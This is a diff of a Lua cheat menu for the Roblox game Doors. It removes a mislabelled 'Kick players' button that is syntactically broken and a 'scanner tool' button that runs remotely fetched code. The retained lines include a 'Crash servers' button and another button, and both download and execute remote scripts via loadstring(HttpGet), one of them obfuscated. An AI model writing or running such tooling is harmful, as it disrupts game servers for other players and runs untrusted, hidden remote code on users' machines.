@@ -173,24 +173,6 @@ local Tab = Window:CreateTab("Doors", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("scripts")
 
 local Button = Tab:CreateButton({
-   Name = "Kick players",
-   Callback = function()
-      kick script game.Players.LocalPlayer.Character.Humanoid.Health = 0
-wait(10)
-game.Players.LocalPlayer:Kick("haha yes")
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "scanner tool",
-   Callback = function()
-      scanner tool: _G.scanner_fps = 120
-_G.disable_static = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/main/Scanner.lua"))()
-   end,
-})
-
-local Button = Tab:CreateButton({
    Name = "Crash servers",
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/refs/heads/main/doors/crasher.luau"))()
@@ -224,7 +206,4 @@ local Button = Tab:CreateButton({
       loadstring(game:HttpGet("https://raw.githubusercontent.com/DripCapybara/Doors-Modes/refs/heads/main/CreepyMode/ObfuscatedMain.lua"))()
    end,
 })
-
-
-
 
